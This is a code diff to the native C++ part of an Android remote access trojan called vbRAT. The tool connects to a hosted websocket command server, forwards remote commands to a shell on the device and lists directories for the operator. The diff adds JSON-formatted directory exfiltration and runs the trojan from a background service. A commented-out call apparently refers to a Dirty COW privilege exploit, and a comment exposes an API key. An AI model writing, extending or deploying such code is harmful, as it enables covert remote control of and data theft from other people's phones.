@@ -8,6 +8,10 @@
 #include <list>
 #include <string>
 #include <dirent.h>
+#include <android/asset_manager.h>
+#include <android/asset_manager_jni.h>
+#include <json/json-builder.h>
+#include <json/json.h>
 #include "vbConnection.h"
 #include "vbDeviceProperties.h"
 #include "vbTTY.h"
@@ -16,14 +20,15 @@
 
 typedef struct
 {
+    char appPath[512];
     bool tips;
 } vbrat_t;
 
 vbrat_t vbRAT;
-
+JNIEnv *penv;
 using namespace std;
 //#define SERVER_ADDR "wss://connect.websocket.in/v3/69?apiKey=l7d6CdYNyjLFsRA0uzyFD6Ec0pcPkhKFlYVNwJPeWgTmAIFhZoeM9U5LO3Zi"
-#define SERVER_ADDR "wss://vbrat-server.herokuapp.com/zio"
+#define SERVER_ADDR "wss://vbrat-server.herokuapp.com/test"
 
 void _printTip(const char *msg)
 {
@@ -60,7 +65,11 @@ void vbRAT_messageReceived(const char* buf, int len)
             vbConnection_Send("~Terminal session closed.");
         }
         else
+        {
+            if(buf[0] == ';')
+                vbConnection_Send("~A terminal session is running use ;shellstop to give me commands \n");
             vbTTY_send(buf);
+        }
     }
     else if(strcmp(buf, ";shellstop")==0)
     {
@@ -122,28 +131,47 @@ void vbRAT_messageReceived(const char* buf, int len)
     {
         if(strlen(buf)> strlen(";scandir "))
         {
-            char tosend[1024];
+            char *tosend;
+            char *jsondir;
             char targetdir[512];
             snprintf(targetdir, 512, "%s", &buf[9]);
+            //AAssetManager *mgr;
+            //AAssetDir* assetDir = AAssetManager_openDir(mgr, "/");
+            //const char* filename = AAssetDir_getNextFileName(assetDir);
+            //filename = AAssetDir_getNextFileName(assetDir);
+
+            //AAssetDir_close(assetDir);
+
             struct dirent **fileListTemp;
             int nof = scandir(targetdir, &fileListTemp, NULL, alphasort);
             if (nof < 0)
-                vbConnection_Send("access denied");
+                vbConnection_Send("~ls access denied");
             else
             {
-                snprintf(tosend, 1024, "~ls %s", targetdir);
-                vbConnection_Send(tosend);
+                json_value *dir = json_object_new(0);
+                json_value *dirname = json_string_new(targetdir);
+                json_value *files = json_array_new(0);
+
                 for (int i = 0; i < nof; i++)
                 {
-                    //snprintf(tosend, 1024, "%s - %d", fileListTemp[i]->d_name, fileListTemp[i]->d_type);
-                    snprintf(tosend, 1024, "%s - %d", fileListTemp[i]->d_name,
-                             fileListTemp[i]->d_type);
-                    vbConnection_Send(tosend);
+                    json_value *file = json_object_new(2);
+                    json_value *fname = json_string_new(fileListTemp[i]->d_name);
+                    json_value *ftype = json_integer_new(fileListTemp[i]->d_type);
+                    json_object_push(file, "fname", fname);
+                    json_object_push(file, "ftype", ftype);
+                    json_array_push(files, file);
                 }
+                json_object_push(dir, "dirname", dirname);
+                json_object_push(dir, "flist", files);
+                jsondir = (char *) malloc(json_measure(dir));
+                json_serialize(jsondir, dir);
+                tosend = (char *) malloc(strlen(jsondir)+5);
+                snprintf(tosend, strlen(jsondir)+5, "~ls %s", jsondir);
+                vbConnection_Send(tosend);
             }
         }
         else
-            vbConnection_Send("Usage: ;scandir \"dir path\" [prints the content of the given directory]");
+            vbConnection_Send("~Usage: ;scandir \"dir path\" [prints the content of the given directory]");
     }
     else if(strcmp(buf, ";help")==0) //
     {
@@ -166,10 +194,15 @@ void vbRAT_messageReceived(const char* buf, int len)
 //Java_com_example_vbrat_MainActivity_vbRATstart(JNIEnv *env, jobject MainActivity)
 
 extern "C" JNIEXPORT jint JNICALL
-Java_com_example_vbrat_service_vbRATstart(JNIEnv *env, jobject MainActivity)
+Java_com_example_vbrat_BackgroundService_vbRATstart(JNIEnv *env, jobject MainActivity, jstring datadir)
+//Java_com_example_vbrat_service_vbRATstart(JNIEnv *env, jobject MainActivity, jstring datadir)
 {
     LOGW("Started..");
+    penv=env;
     vbRAT.tips = true;
+    //dcow(0,0);
+    if(datadir)
+        snprintf(vbRAT.appPath, 512, "%s/", env->GetStringUTFChars(datadir, 0));
     vbConnection_onConnected(vbRAT_connected);
     vbConnection_onDisconnected(vbRAT_disconnected);
     vbConnection_onMessage(vbRAT_messageReceived);
@@ -177,7 +210,8 @@ Java_com_example_vbrat_service_vbRATstart(JNIEnv *env, jobject MainActivity)
 }
 
 extern "C" JNIEXPORT jint JNICALL
-Java_com_example_vbrat_service_vbRATstop(JNIEnv *env, jobject MainActivity)
+Java_com_example_vbrat_BackgroundService_vbRATstop(JNIEnv *env, jobject MainActivity)
+//Java_com_example_vbrat_service_vbRATstop(JNIEnv *env, jobject MainActivity)
 {
     LOGW("Stopped..");
     vbConnection_Send("~Getting disconnected...");
@@ -185,7 +219,7 @@ Java_com_example_vbrat_service_vbRATstop(JNIEnv *env, jobject MainActivity)
 }
 
 extern "C" JNIEXPORT jstring JNICALL
-Java_com_example_vbrat_MainActivity_checkStatus(JNIEnv *env, jobject MainActivity)
+Java_com_example_vbrat_BackgroundService_vbRATCheckStatus(JNIEnv *env, jobject MainActivity)
 {
     vbConnection_getError();
     switch(vbConnection_getState())
